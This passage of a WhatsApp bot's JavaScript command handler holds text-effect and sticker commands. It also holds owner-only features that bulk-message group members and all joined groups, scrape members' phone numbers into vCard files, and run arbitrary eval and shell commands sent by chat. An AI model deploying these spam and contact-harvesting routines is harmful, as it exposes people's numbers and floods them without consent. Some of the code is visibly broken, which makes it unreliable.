                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
               
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replydare(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replydare('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				dare.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				dare.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replydare(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replydare(`Example : ${prefix+command} dare`) 
replydare(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
dare.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'ephoto360menu': {
let menya = `
┏『 *\`Ephoto 𝐌𝐄𝐍𝐔\`* 』━◧
┣» *glitchtext*
┣» *writetext*
┣» *advancedglow*
┣» *typographytext*
┣» *pixelglitch*
┣» *neonglitch*
┣» *flagtext*
┣» *flag3dtext*
┣» *deletingtext*
┣» *blackpinkstyle*
┣» *glowingtext*
┣» *underwatertext*
┣» *logomaker*
┣» *cartoonstyle*
┣» *papercutstyle*
┣» *watercolortext*
┣» *effectclouds*
┣» *blackpinklogo*
┣» *gradienttext*
┣» *summerbeach*
┣» *luxurygold*
┣» *multicoloredneon*
┣» *sandsummer*
┣» *galaxywallpaper*
┣» *1917style*
┣» *makingneon*
┣» *royaltext*
┣» *freecreate*
┣» *galaxystyle*
┣» *lighteffects*
┗━━━━━━━━━━━━━━━━⊱`
dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.imgur.com/5jNLcST.jpeg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VadIfkvFSAt7RRohyF0t",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'pushmenu': {
let menya = `┏『 *\`𝐏𝐔𝐒𝐇 𝐌𝐄𝐍𝐔\`* 』━━◧
┣» *${prefix}pushcontact*
┣» *${prefix}savecontact*
┣» *${prefix}savecontact2*
┣» *${prefix}getcontact*
┣» *${prefix}sendcontact*
┣» *${prefix}jpm*
┣» *${prefix}jpm2*
┗━━━━━━━━━━━━━━━━⊱`
dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.imgur.com/5jNLcST.jpeg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VadIfkvFSAt7RRohyF0t",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'pushcontact': {
    if (!isCreator) return replydare(mess.owner)
      if (!m.isGroup) return replydare(`The feature works only in grup`)
    if (!text) return replydare(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replydare(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    dare.sendMessage(pler, { text: q})
     }  
     replydare(`Done`)
      }
      break
case 'pushcontact2':{
if (!isCreator) return replydare(mess.owner)
if (!q) return replydare(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
reply(mess.wait)
const metadata2 = await dare.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
dare.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replydare(`Success`)
}
break

case 'pushcontact3':
if (!isCreator) return replydare(`For Owners Only`)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup|pause|text\nTo See Group Id Please Type .idgroup`)
await reply("Otw Boskuuu ")
const groupMetadataa = !m.isGroup? await dare.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await dare.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await dare.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await dare.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Success Boss!")
break
case 'pushcontact4':
if (!isCreator) return replydare(`Owners only`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} pause|text`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await dare.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await dare.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await dare.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break

case 'savecontact': case 'svkontak':
if (!isCreator) return replydare(`For Owners Only`)
if (!m.isGroup) return replydare(`This feature is group specific`)
let cmiggc = await dare.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Import '+cmiggc.participants.length+' contact..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
dare.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break

case 'cekidgc': {
if (!isPrem) return replyprem(mess.premium)
let getGroups = await dare.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST OF GROUPS BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await dare.groupMetadata(x)
teks += `◉ No : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `To use, please type the command ${prefix}pushcontact3 id|text\n\nBefore using, please copy the group ID above.`)
}
break
case 'savecontact2': {
if (!isCreator) return replydare(`For Owners Only`)
if (!m.isGroup) return replydare(mess.only.private)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup\nTo See Group Id Please Type .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !m.isGroup? await dare.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await dare.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "𝐁𝐌𝐁.vcf", caption: "Success Just Save, Brother", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case 'jpm':{
if (!isCreator) return replydare(`Owners only`)
if (!text) return reply(`*Wrong Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Image To All Groups\nFor the delay, the nominal delay is 1000 = 1 second`)
await reply("_Wait, my lord🙂_")
let getGroups = await dare.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await dare.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await dare.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await dare.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await dare.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL THAN OWNER🙂*")
}
break

case 'jpm2':{
if (!isCreator) return replydare(`Owners only`)
if (!text) return reply(`*Wrong Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Image To All Groups\nFor the delay, the nominal delay is 1000 = 1 second`)
await reply("_Wait, my lord🙂_")
let getGroups = await dare.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await dare.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await dare.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await dare.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await dare.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL THAN OWNER🙂*")
}
break

case 'sendcontact': case 'kontak':
if (!isCreator) return replydare(`Owners only`)
if (!m.isGroup) return replydare(`Special Group`)
if (!m.mentionedJid[0]) return reply('Ex; .sendcontact @tag|no.')
let snContact = {
	displayName: "Contact", contacts: [{displayName: ownername, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownername+";;;\nFN:"+ownername+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
dare.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'getcontact': case 'getkontak':
if (!isCreator) return replydare(`Owners only`)
if (!m.isGroup) return replydare(`This feature is group specific`)
huhuhs = await dare.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
dare.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replydare(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replydare(bang)
                    }
                    try {
                        replydare(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replydare(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replydare(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replydare(evaled)
                    } catch (err) {
                        await replydare(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replydare(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replydare(err)
                        if (stdout) return replydare(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})